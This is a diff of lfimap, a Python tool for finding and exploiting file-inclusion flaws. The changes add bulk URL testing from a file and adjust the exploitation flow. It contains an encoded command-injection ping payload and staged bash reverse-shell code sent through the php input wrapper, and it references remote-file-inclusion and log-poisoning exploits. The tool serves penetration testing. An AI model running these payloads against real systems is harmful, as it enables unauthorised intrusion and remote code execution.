@@ -66,8 +66,8 @@ def serve_forever():
             except:
                 httpd.server_close()
     except:
-        print("[!] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable! Skipping RFI check...")
-        raise
+        if(args.verbose):
+            print("[i] Cannot setup local web server on port " + str(rfi_test_port) + ", it's in use or unavailable, still trying to include it...")
 
 class ICMPThread(threading.Thread):
     def __init__(self):
@@ -165,7 +165,6 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
         TO_REPLACE.append("ping%20-n%201%20" + args.lhost)
         TO_REPLACE.append("test%3Bping%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D1%24%7BIFS%25%3F%3F%7D{0}%3B".format(args.lhost))
 
-
     if(checkPayload(req) or cmdInjectable):
         for i in range(len(TO_REPLACE)):
             if(getVal.find(TO_REPLACE[i]) > -1 or postVal.find(TO_REPLACE[i]) > -1 or getVal.find("?c=" + TO_REPLACE[i]) > -1):
@@ -177,7 +176,7 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
                 else: os = "linux"
 
                 exploit = addToExploits(req, reqType, explType, u, p, headers, attackType, os)
-                    
+                
                 #Print finding
                 if(postVal == ""):
                     print("[+] " + explType + " -> '" + getVal + "'")
@@ -433,7 +432,6 @@ def test_input(url):
     
     for i in range(len(tests)):
         u = url.replace(args.param, tests[i])
-        
         for j in range(len(posts)):
             res = requests.post(u, headers = headers, data=posts[j], proxies = proxies)
             if(init(res, "POST", "RCE", u, posts[j], headers, "INPUT")):
@@ -572,7 +570,6 @@ def test_heuristics(url):
     if("lfimap<>referer" in res.text):
         print("[+] Possible XSS, reflected 'Referer' string discovered in response.")
 
-    print("")
     return
 
 
@@ -613,7 +610,9 @@ def exploit_bash(exploit, method, ip, port):
 
     if(method == "INPUT"):
         res = requests.post(url.replace(tempArg, bashTest), headers = headers, data=exploit['POSTVAL'], proxies = proxies)
+        
         if("/bash" in res.text):
+
             u = url.replace(tempArg, bashPayloadStageOne)
             printInfo(ip, port, "bash", "input wrapper")
             requests.post(u, headers = headers, data = exploit['POSTVAL'], proxies = proxies)
@@ -922,7 +921,9 @@ def prepareRfiExploit(payloadFile, temporaryFile, ip, port):
             print(line.replace("PORT_NUMBER", str(port)), end='')
 
 def exploit_rfi(exploit, method, ip, port):
-    
+    if(args.f):
+        return
+
     url = exploit['GETVAL']
     printInfo(ip, port, "php", "Remote File Inclusion")
     
@@ -946,6 +947,9 @@ def exploit_rfi(exploit, method, ip, port):
 
 
 def exploit_log_poison(ip, port, url, payloadStageOne, payloadStageTwo, testPayload, testString, post):
+    if(args.f):
+        return
+
     if(args.verbose):
         print("[i] Trying to locate http access log file...")
 
@@ -1070,65 +1074,140 @@ def main():
     
     proxies['http'] = args.proxyAddr
     proxies['https'] = args.proxyAddr
-
-    #Perform all tests
-    if(args.test_all):
-        test_heuristics(url)
-        test_filter(url)
-        test_input(url)
-        test_data(url)
-        test_expect(url)
-        test_rfi(url)
-        test_file_trunc(url)
-        test_trunc(url)
-        test_cmd_injection(url)
-        test_xss(url)
-
-        print("Done.")
-        lfimap_cleanup()
-
-    default = True
     
-    if(args.heuristics):
-        default = False
-        test_heuristics(url)
-    if(args.php_filter):
-        default = False
-        test_filter(url)
-    if(args.php_input):
-        default = False
-        test_input(url)
-    if(args.php_data):
-        default = False
-        test_data(url)
-    if(args.php_expect):
-        default = False
-        test_expect(url)
-    if(args.rfi):
-        default = False
-        test_rfi(url)
-    if(args.file):
-        default = False
-        test_file_trunc(url)
-    if(args.trunc):
-        default = False
-        test_trunc(url)
-    if(args.cmd):
-        default=False
-        test_cmd_injection(url)
-    if(args.xss):
-        default = False
-        test_xss(url)
+    # If multiple URLS are specified from a file.
+    if(args.f):
+        c = 0
+        with open(args.f, "r") as fl:
+            lines = fl.read().splitlines()
+            for line in lines:
+                print("\n[ii] Testing URL: " + str(line))
+                #Perform all tests
+                
+                default = True
+                if(args.test_all):
+                    test_heuristics(line)
+                    test_filter(line)
+                    test_input(line)
+                    test_data(line)
+                    test_expect(line)
+                    test_rfi(line)
+                    test_file_trunc(line)
+                    test_trunc(line)
+                    test_cmd_injection(line)
+                    test_xss(line)
+                    default = False        
+            
+                if(args.heuristics):
+                    default = False
+                    test_heuristics(line)
+                if(args.php_filter):
+                    default = False
+                    test_filter(line)
+                if(args.php_input):
+                    default = False
+                    test_input(line)
+                if(args.php_data):
+                    default = False
+                    test_data(line)
+                if(args.php_expect):
+                    default = False
+                    test_expect(line)
+                if(args.rfi):
+                    default = False
+                    test_rfi(line)
+                if(args.file):
+                    default = False
+                    test_file_trunc(line)
+                if(args.trunc):
+                    default = False
+                    test_trunc(line)
+                if(args.cmd):
+                    default=False
+                    test_cmd_injection(line)
+                if(args.xss):
+                    default = False
+                    test_xss(line)
+            
+                #Default behaviour
+                if(default):
+                    test_filter(line)
+                    test_input(line)
+                    test_data(line)
+                    test_expect(line)
+                    test_rfi(line)
+                    test_file_trunc(line)
+                    test_trunc(line)
+                
+                c += 1
+                if(c == len(lines)):
+                    print("Done.")
+                    lfimap_cleanup()
+                else: continue
+
+        sys.exit(0)
+
+    # If single URL is specified
+    else:
+        url = args.url
+        #Perform all tests
+        if(args.test_all):
+            test_heuristics(url)
+            test_filter(url)
+            test_input(url)
+            test_data(url)
+            test_expect(url)
+            test_rfi(url)
+            test_file_trunc(url)
+            test_trunc(url)
+            test_cmd_injection(url)
+            test_xss(url)
+
+            print("Done.")
+            lfimap_cleanup()
+
+        default = True
     
-    #Default behaviour
-    if(default):
-        test_filter(url)
-        test_input(url)
-        test_data(url)
-        test_expect(url)
-        test_rfi(url)
-        test_file_trunc(url)
-        test_trunc(url)
+        if(args.heuristics):
+            default = False
+            test_heuristics(url)
+        if(args.php_filter):
+            default = False
+            test_filter(url)
+        if(args.php_input):
+            default = False
+            test_input(url)
+        if(args.php_data):
+            default = False
+            test_data(url)
+        if(args.php_expect):
+            default = False
+            test_expect(url)
+        if(args.rfi):
+            default = False
+            test_rfi(url)
+        if(args.file):
+            default = False
+            test_file_trunc(url)
+        if(args.trunc):
+            default = False
+            test_trunc(url)
+        if(args.cmd):
+            default=False
+            test_cmd_injection(url)
+        if(args.xss):
+            default = False
+            test_xss(url)
+    
+        #Default behaviour
+        if(default):
+            test_filter(url)
+            test_input(url)
+            test_data(url)
+            test_expect(url)
+            test_rfi(url)
+            test_file_trunc(url)
+            test_trunc(url)
 
     print("Done.")
     lfimap_cleanup()
@@ -1139,12 +1218,13 @@ if(__name__ == "__main__"):
     parser = argparse.ArgumentParser(description="lfimap, Local File Inclusion discovery and exploitation tool", formatter_class=RawTextHelpFormatter, add_help=False)
     
     mandatoryGroup = parser.add_argument_group("MANDATORY")
-    mandatoryGroup.add_argument('url', type=str, metavar="URL", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
-    
+    mandatoryGroup.add_argument('-U', type=str,nargs="?", metavar="url", dest="url", help="""\t\t Specify url, Ex: "http://example.org/vuln.php?param=PWN" """)
+    mandatoryGroup.add_argument('-F', type=str, nargs="?", metavar="urlfile", dest="f", help="\t\t Specify url wordlist (every line should have --param|'PWN'.)")
+
     optionsGroup = parser.add_argument_group('GENERAL OPTIONS')
+    optionsGroup.add_argument('-C', type=str, metavar='<cookie>', dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
     optionsGroup.add_argument('-D', type=str, metavar='<request>', dest='postreq', help='\t\t Do HTTP POST value test. Ex: "param=PWN"')
     optionsGroup.add_argument('-H', type=str, metavar='<header>', action='append', dest='httpheaders', help='\t\t Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"')
-    optionsGroup.add_argument('-C', type=str, metavar='<cookie>', dest='cookie', help='\t\t Specify session cookie, Ex: "PHPSESSID=1943785348b45"')
     optionsGroup.add_argument('-P', type=str, metavar = '<proxy>', dest='proxyAddr', help='\t\t Specify Proxy IP address. Ex: "http://127.0.0.1:8080"')
     optionsGroup.add_argument('--useragent', type=str, metavar= '<agent>', dest='agent', help='\t\t Specify HTTP user agent')
     optionsGroup.add_argument('--referer', type=str, metavar = '<referer>', dest='referer', help='\t\t Specify HTTP referer')
@@ -1180,14 +1260,18 @@ if(__name__ == "__main__"):
     args = parser.parse_args()
 
     url = args.url
+    urlfile = args.f
     truncWordlist = args.truncWordlist
     xssWordlist = args.xssWordlist
     cmdWordlist = args.cmdWordlist
     agent = args.agent
     referer = args.referer
     
+    # if '-F' is provided, set mode to file
+    if(args.f): mode="file"
     # if '-D' is provided, set mode to post
-    if(args.postreq): mode = "post"
+    elif(args.postreq): mode = "post"
+    # otherwise, set mode to get
     else: mode = "get"
     
     if(not args.param):
@@ -1198,8 +1282,15 @@ if(__name__ == "__main__"):
         print("[!] Cookie argument ('-C') is not provided. lfimap might have troubles finding vulnerabilities if web app requires a cookie.\n")
     
     if(args.php_filter or args.php_input or args.php_data or args.php_expect or args.trunc or args.rfi or args.cmd or args.file or args.xss or args.test_all or not args.heuristics):
+        
+        if(mode=="file"):
+            # Check if file exists
+            if(not os.path.exists(args.f)):
+                print("[-] File '" + args.f + "' doesn't exist. Exiting...")
+                sys.exit(-1)
+
         # Checks if any parameter is selected for testing
-        if(mode == "get"):
+        elif(mode == "get"):
             if(args.param not in url):
                 print("[-] '" + args.param + "' is not found in the URL. Please specify it as a parameter value for testing. Exiting...\n")
                 sys.exit(-1)
@@ -1211,20 +1302,21 @@ if(__name__ == "__main__"):
             if(args.param in args.url):
                 print("[-] Cannot do POST and GET mode testing at once. Exiting...\n")
                 sys.exit(-1)
-
-    #If testing using GET this checks if provided URL is valid
-    urlRegex = re.compile(
-    r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
-    r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
-    r'localhost|' #localhost...
-    r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
-    r'(?::\d+)?' # optional port
-    r'(?:/?|[/?]\S+)$', re.IGNORECASE)
+    
+    if(mode != "file"):
+        #If testing using GET this checks if provided URL is valid
+        urlRegex = re.compile(
+        r'^(?:http|ftp)s?://' # http:// or https:// or ftp://
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
+        r'localhost|' #localhost...
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
+        r'(?::\d+)?' # optional port
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
     
 
-    if(re.match(urlRegex, url) is None):
-        print("URL not valid, exiting...")
-        sys.exit(-1)
+        if(re.match(urlRegex, url) is None):
+            print("URL not valid, exiting...")
+            sys.exit(-1)
 
     #Check if provided trunc wordlist exists
     if(truncWordlist is not None):
@@ -1293,14 +1385,34 @@ if(__name__ == "__main__"):
         else: 
             print("[-] Please specify proxy protocol: http://, https:// or socks5://. Exiting...")
             sys.exit(-1)
-
-    #Preparing temp args
+    
+    #Setup a temporary argument placeholder.
+    exists = False
     TEMP = ["CMD", "TEMP", "LFIMAP", "LFI"]
-    for item in TEMP:
-        if(item not in args.url):
-            tempArg = item
-            break
+    
+    if(mode != "file"):
+        for item in TEMP:
+            if(item not in args.url):
+                tempArg = item
+                break
+    else: 
+        with open(args.f, "r") as fi:
+            lines = fi.read().splitlines()
+            for item in TEMP:
+                for line in lines:
+                    if(item in line):
+                        exists = True
+                if(not exists):
+                    tempArg = item
+                    break
 
+    if(mode == "file" and args.revshell):
+        print("[!] Specifing multiple url testing with '-F' and reverse shell attack with '-x' is NOT RECOMMENDED, unless you know what you're doing.")
+        option = input("[?] Are you sure you want to continue? y/n: ")
+        if(option != "y" and option != "Y"):
+            print("[i] User selected exit option. Exiting...")
+            sys.exit(-1)
+        
     #Preparing headers
     headers = prepareHeaders()
     if(args.cookie is not None):
@@ -1318,4 +1430,5 @@ if(__name__ == "__main__"):
             else:
                 addHeader(args.httpheaders[i].split(":",1)[0].replace(" ",""), args.httpheaders[i].split(":",1)[1].replace(" ", ""))
     main()
+
 
